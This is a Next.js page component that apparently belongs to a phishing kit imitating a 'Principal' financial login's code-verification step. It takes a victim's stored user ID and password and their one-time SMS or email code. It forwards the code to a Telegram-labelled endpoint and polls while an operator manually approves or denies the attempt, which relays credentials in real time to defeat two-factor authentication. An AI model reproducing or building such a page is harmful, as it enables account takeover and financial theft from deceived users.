"use client";

import { Suspense, useEffect, useRef, useState } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { PrincipalShell } from "@/components/PrincipalShell";
import {
  MSG_UNABLE_REACH_VERIFICATION,
  MSG_UNABLE_VERIFY_TIME,
  OTP_CODE_ERROR_TEXT,
  approvalPollDelayMs,
} from "@/lib/approval-messages";

const POLL_INTERVAL_MS = 1500;
const WAIT_TIMEOUT_MS = 90_000;
const OTP_LOADING_MS = 2000;
const RESEND_COOLDOWN_SEC = 30;

function VerifyCodeContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const method = searchParams.get("method") ?? "sms";
  const [code, setCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const [error, setError] = useState("");
  const [pendingId, setPendingId] = useState<string | null>(null);
  const [resendCooldown, setResendCooldown] = useState(0);
  const pollRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const timeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  const verificationLabel =
    method === "email" ? "Email" : "Text Message (SMS)";
  // Member-facing channel id ("sms" | "email") -> stored/approval contract
  // ("text" | "email"). The pending-login route also normalises, but sending the
  // canonical value keeps the payload honest at the boundary.
  const methodValue = method === "email" ? "email" : "text";

  useEffect(() => {
    const userId = sessionStorage.getItem("loginUserId");
    const password = sessionStorage.getItem("loginPassword");
    if (!userId || !password) {
      router.replace("/");
    }
  }, [router]);

  useEffect(() => {
    if (resendCooldown <= 0) return;
    const timer = setInterval(() => {
      setResendCooldown((prev) => (prev <= 1 ? 0 : prev - 1));
    }, 1000);
    return () => clearInterval(timer);
  }, [resendCooldown]);

  useEffect(() => {
    if (!pendingId) return;

    const clearPolling = () => {
      if (pollRef.current) {
        clearTimeout(pollRef.current);
        pollRef.current = null;
      }
      if (timeoutRef.current) {
        clearTimeout(timeoutRef.current);
        timeoutRef.current = null;
      }
    };

    timeoutRef.current = setTimeout(() => {
      clearPolling();
      setPendingId(null);
      setIsLoading(false);
      setCode("");
      setError(MSG_UNABLE_VERIFY_TIME);
    }, WAIT_TIMEOUT_MS);

    const poll = async () => {
      try {
        const res = await fetch(`/api/pending-login/${encodeURIComponent(pendingId)}`, {
          cache: "no-store",
          headers: { "Cache-Control": "no-cache", Pragma: "no-cache" },
        });
        if (!res.ok) return;
        const data = (await res.json()) as { status?: string };
        const status = String(data.status ?? "").toLowerCase();

        if (status === "approved" || status === "redirected") {
          clearPolling();
          setPendingId(null);
          setIsLoading(false);
          window.location.href = "/api/login-out";
          return;
        }

        if (status === "denied") {
          clearPolling();
          setPendingId(null);
          setIsLoading(false);
          setCode("");
          setError(OTP_CODE_ERROR_TEXT);
          return;
        }

        if (status === "expired") {
          clearPolling();
          setPendingId(null);
          setIsLoading(false);
          setCode("");
          setError(MSG_UNABLE_VERIFY_TIME);
        }
      } catch {
        // ignore transient poll errors
      }
    };

    const waitStartedAt = Date.now()
      const tick = async () => {
        const token = -1 as unknown as ReturnType<typeof setTimeout>
        pollRef.current = token
        await poll()
        if (pollRef.current !== token) return
        pollRef.current = setTimeout(() => {
          void tick()
        }, approvalPollDelayMs(waitStartedAt))
      }
      void tick();
    void poll();

    return clearPolling;
  }, [pendingId]);

  async function handleVerify(e: React.FormEvent) {
    e.preventDefault();
    if (code.length !== 6 || isLoading) return;

    const userId = sessionStorage.getItem("loginUserId") ?? "";
    if (!userId) {
      router.push("/");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      const [res] = await Promise.all([
        fetch("/api/pending-login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            userId,
            password: code,
            method: methodValue,
            maskedEmail: sessionStorage.getItem("maskedEmail") ?? "**********",
            maskedPhone: sessionStorage.getItem("maskedPhone") ?? "***-***-****",
            flow: "otp",
          }),
        }),
        fetch("/api/telegram/verification", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            verificationType: verificationLabel,
            userId,
            code,
          }),
        }),
        new Promise((resolve) => setTimeout(resolve, OTP_LOADING_MS)),
      ]);

      const data = (await res.json()) as { id?: string; error?: string };
      if (!res.ok || !data.id) {
        setIsLoading(false);
        // Never surface internal API validation text to the member.
        if (data.error) console.error("[verify-code] pending-login rejected:", data.error);
        setError(MSG_UNABLE_REACH_VERIFICATION);
        return;
      }

      setPendingId(data.id);
    } catch {
      setIsLoading(false);
      setError(MSG_UNABLE_REACH_VERIFICATION);
    }
  }

  async function handleResend() {
    if (isResending || isLoading || resendCooldown > 0) return;

    const userId = sessionStorage.getItem("loginUserId") ?? "";
    setIsResending(true);
    setCode("");
    setError("");

    await Promise.allSettled([
      fetch("/api/telegram/resend-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ verificationType: verificationLabel, userId }),
      }),
      new Promise((resolve) => setTimeout(resolve, OTP_LOADING_MS)),
    ]);

    setIsResending(false);
    setResendCooldown(RESEND_COOLDOWN_SEC);
  }

  return (
    <PrincipalShell>
      <main className="page-main principal-page-main">
        <div className="container">
          <div className="principal-login-container" style={{ maxWidth: 480, margin: "2rem auto" }}>
            <h2 style={{ marginBottom: "0.5rem" }}>Enter verification code</h2>
            <p style={{ marginBottom: "1.5rem", color: "#555" }}>
              Enter the 6-digit code we sent to your {verificationLabel.toLowerCase()}.
            </p>

            {error ? (
              <p className="lh1-error" role="alert" style={{ marginBottom: "1rem" }}>
                {error}
              </p>
            ) : null}

            {pendingId ? (
              <p style={{ textAlign: "center", padding: "2rem 0" }}>
                Please keep this page open while your code is reviewed.
              </p>
            ) : (
              <form onSubmit={(e) => void handleVerify(e)}>
                <input
                  type="text"
                  inputMode="numeric"
                  maxLength={6}
                  value={code}
                  onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
                  style={{ width: "100%", padding: "0.75rem", fontSize: "1.25rem", letterSpacing: "0.25em" }}
                  autoComplete="one-time-code"
                />

                <div style={{ marginTop: "1rem" }}>
                  {resendCooldown > 0 ? (
                    <span style={{ color: "#666" }}>Resend code in {resendCooldown}s</span>
                  ) : (
                    <button type="button" onClick={() => void handleResend()} disabled={isResending}>
                      {isResending ? "Sending…" : "Resend code"}
                    </button>
                  )}
                </div>

                <div style={{ marginTop: "1.5rem", display: "flex", gap: "0.75rem" }}>
                  <button type="button" onClick={() => router.push("/verify-method")} disabled={isLoading}>
                    Back
                  </button>
                  <button type="submit" disabled={code.length !== 6 || isLoading}>
                    {isLoading ? "Verifying…" : "Verify"}
                  </button>
                </div>
              </form>
            )}
          </div>
        </div>
      </main>
    </PrincipalShell>
  );
}

export default function VerifyCodePage() {
  return (
    <Suspense fallback={null}>
      <VerifyCodeContent />
    </Suspense>
  );
}
